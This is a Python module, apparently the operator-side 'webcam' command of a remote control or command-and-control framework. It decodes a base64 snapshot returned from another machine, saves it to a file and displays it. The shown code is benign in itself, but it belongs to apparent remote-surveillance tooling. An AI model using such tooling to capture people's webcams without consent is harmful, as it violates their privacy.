import os
import base64
import time
from PIL import Image
from apps.client.modules.libs.mod_client_interface import mod_client_interface


class mod_client_webcam(mod_client_interface):

    cmd_short = "wd"
    cmd_long = "webcam"
    cmd_desc = "Webcam client module"

    def setup_mod(self):
        print(f'Module Setup (mod_client_webcam) called successfully!')

    def get_datetime_str(self):
        return time.strftime("%Y%m%d-%H%M%S")

    def run_mod(self, message):
        result = super(mod_client_webcam, self).run_mod(message)
        cur_dir = os.path.abspath("./tmp")
        print("CurDir: " + cur_dir)
        base64ToolContent = result['img']
        base64ToolContent = base64ToolContent.encode()

        if result['filename_path'] != "":
            if str(result['filename_path']).__contains__("/"):
                image_out = result['filename_path']
            else:
                image_out = f"{cur_dir}/" + result['filename_path']
        else:
            image_out = f"{cur_dir}/webcam-{self.get_datetime_str()}.png"

        with open(image_out, "wb") as output_file:
            output_file.write(base64.b64decode(base64ToolContent))

        with Image.open(image_out) as img:
            img.show()
        return f"Webcam snapshot saved to: {image_out}"
